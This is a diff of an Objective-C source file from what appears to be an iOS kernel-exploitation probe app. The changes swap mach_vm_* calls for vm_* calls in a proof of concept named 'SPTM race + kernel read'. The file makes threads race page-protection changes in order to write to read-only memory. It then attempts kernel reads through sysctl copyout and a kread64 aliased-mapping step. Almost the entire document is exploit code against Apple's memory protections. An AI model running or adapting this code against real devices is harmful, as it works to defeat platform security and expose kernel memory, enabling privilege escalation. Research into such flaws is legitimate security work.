@@ -15,7 +15,7 @@ static void pin_to_core(int core) {
 }
 
 typedef struct {
-    mach_vm_address_t page;
+    vm_address_t page;
     volatile int running;
     int core;
 } sptm_ctx_t;
@@ -24,7 +24,7 @@ static void *sptm_read_thread(void *arg) {
     sptm_ctx_t *ctx = (sptm_ctx_t *)arg;
     pin_to_core(ctx->core);
     while (ctx->running) {
-        mach_vm_protect(mach_task_self(), ctx->page, 4096, false, VM_PROT_READ);
+        vm_protect(mach_task_self(), ctx->page, 4096, false, VM_PROT_READ);
         usleep(RACE_USLEEP);
     }
     return NULL;
@@ -34,7 +34,7 @@ static void *sptm_write_thread(void *arg) {
     sptm_ctx_t *ctx = (sptm_ctx_t *)arg;
     pin_to_core(ctx->core);
     while (ctx->running) {
-        mach_vm_protect(mach_task_self(), ctx->page, 4096, false,
+        vm_protect(mach_task_self(), ctx->page, 4096, false,
                         VM_PROT_READ | VM_PROT_WRITE);
         usleep(RACE_USLEEP);
     }
@@ -56,7 +56,7 @@ static void *sptm_write_thread(void *arg) {
     if (self) {
         _identifier = @"sptm.race";
         _title = @"SPTM race + kernel read";
-        _subtitle = @"mach_vm_protect race -> write to READ-only pages -> sysctl copyout";
+        _subtitle = @"vm_protect race -> write to READ-only pages -> sysctl copyout";
         _icon = @"arrow.triangle.2.circlepath";
         _section = KPTestSectionKernelProbes;
     }
@@ -81,22 +81,22 @@ static void *sptm_write_thread(void *arg) {
 - (NSString *)runReport {
     NSMutableString *report = [NSMutableString string];
     [report appendString:@"=== KexProofV4 · SPTM race + kernel read ===\n"];
-    [report appendString:@"Technique: two threads race mach_vm_protect on a page.\n"];
+    [report appendString:@"Technique: two threads race vm_protect on a page.\n"];
     [report appendString:@"Ref: asuka4scape SPTM race.\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d pid=%d\n",
      UIDevice.currentDevice.systemVersion, getuid(), getpid()];
 
     // --- Phase 1: alloc READ-only page ---
     [report appendString:@"\n--- Phase 1: alloc READ-only page ---\n"];
-    mach_vm_address_t page = 0;
-    kern_return_t kr = mach_vm_allocate(mach_task_self(), &page, 4096, VM_FLAGS_ANYWHERE);
+    vm_address_t page = 0;
+    kern_return_t kr = vm_allocate(mach_task_self(), &page, 4096, VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) {
         [report appendFormat:@"vm_allocate failed: %d\n", kr];
         [report appendString:@"\nVERDICT: ALLOC_FAILED\n"];
         return report;
     }
     memset((void *)page, 0, 4096);
-    kr = mach_vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
+    kr = vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
     if (kr != KERN_SUCCESS) {
         [report appendFormat:@"vm_protect(READ) failed: %d\n", kr];
         [report appendString:@"\nVERDICT: PROTECT_FAILED\n"];
@@ -117,7 +117,7 @@ static void *sptm_write_thread(void *arg) {
     int successes = 0;
     uint32_t test_val = 0xDEADBEEF;
     for (int i = 0; i < RACE_ATTEMPTS; i++) {
-        kr = mach_vm_write(mach_task_self(), page, (pointer_t)&test_val, 4);
+        kr = vm_write(mach_task_self(), page, (pointer_t)&test_val, 4);
         if (kr == KERN_SUCCESS) successes++;
         usleep(50);
     }
@@ -132,8 +132,8 @@ static void *sptm_write_thread(void *arg) {
      (float)successes / RACE_ATTEMPTS * 100.0f];
 
     if (successes == 0) {
-        mach_vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
-        mach_vm_deallocate(mach_task_self(), page, 4096);
+        vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+        vm_deallocate(mach_task_self(), page, 4096);
         [report appendString:@"\nVERDICT: SPTM_RACE_FAILED\n"];
         [report appendString:@"No vm_write successes. Race window not hit.\n"];
         [report appendString:@"Try: different core pairs, longer race, or usleep=0.\n"];
@@ -142,7 +142,7 @@ static void *sptm_write_thread(void *arg) {
     [report appendString:@"*** SPTM RACE CONFIRMED ***\n"];
 
     // Verify write landed
-    mach_vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+    vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
     uint32_t readback = *(volatile uint32_t *)page;
     [report appendFormat:@"readback: 0x%x (expected 0xDEADBEEF)\n", readback];
 
@@ -150,7 +150,7 @@ static void *sptm_write_thread(void *arg) {
     [report appendString:@"\n--- Phase 3: kernel read (sysctl copyout) ---\n"];
 
     // Make page READ-only again
-    mach_vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
+    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
 
     ctxA.running = 1; ctxA.page = page;
     ctxB.running = 1; ctxB.page = page;
@@ -209,7 +209,7 @@ static void *sptm_write_thread(void *arg) {
 
     // Some sysctls return kernel pointers in their data
     // Try to read kernel addresses via sysctl
-    mach_vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
+    vm_protect(mach_task_self(), page, 4096, false, VM_PROT_READ);
     ctxA.running = 1; ctxA.page = page;
     ctxB.running = 1; ctxB.page = page;
     pthread_create(&tA, NULL, sptm_read_thread, &ctxA);
@@ -248,19 +248,19 @@ static void *sptm_write_thread(void *arg) {
     pthread_join(tB, NULL);
 
     // Cleanup
-    mach_vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
-    mach_vm_deallocate(mach_task_self(), page, 4096);
+    vm_protect(mach_task_self(), page, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+    vm_deallocate(mach_task_self(), page, 4096);
 
     // --- Phase 5: kread64 via input→output mapped (kirby technique) ---
     [report appendString:@"\n--- Phase 5: kread64 input->output mapped ---\n"];
 
     // Create aliased mapping: two VAs for same physical page
-    mach_vm_address_t inputAddr = 0, outputAddr = 0;
-    kr = mach_vm_allocate(mach_task_self(), &inputAddr, 4096, VM_FLAGS_ANYWHERE);
+    vm_address_t inputAddr = 0, outputAddr = 0;
+    kr = vm_allocate(mach_task_self(), &inputAddr, 4096, VM_FLAGS_ANYWHERE);
     if (kr == KERN_SUCCESS) {
         memset((void *)inputAddr, 0, 4096);
         // Make READ-only, then try SPTM race to write kernel data
-        mach_vm_protect(mach_task_self(), inputAddr, 4096, false, VM_PROT_READ);
+        vm_protect(mach_task_self(), inputAddr, 4096, false, VM_PROT_READ);
 
         // Create alias via vm_remap
         vm_prot_t curProt, maxProt;
@@ -312,8 +312,8 @@ static void *sptm_write_thread(void *arg) {
 
             vm_deallocate(mach_task_self(), outputAddr, 4096);
         }
-        mach_vm_protect(mach_task_self(), inputAddr, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
-        mach_vm_deallocate(mach_task_self(), inputAddr, 4096);
+        vm_protect(mach_task_self(), inputAddr, 4096, true, VM_PROT_READ | VM_PROT_WRITE);
+        vm_deallocate(mach_task_self(), inputAddr, 4096);
     }
 
     // --- Verdict ---
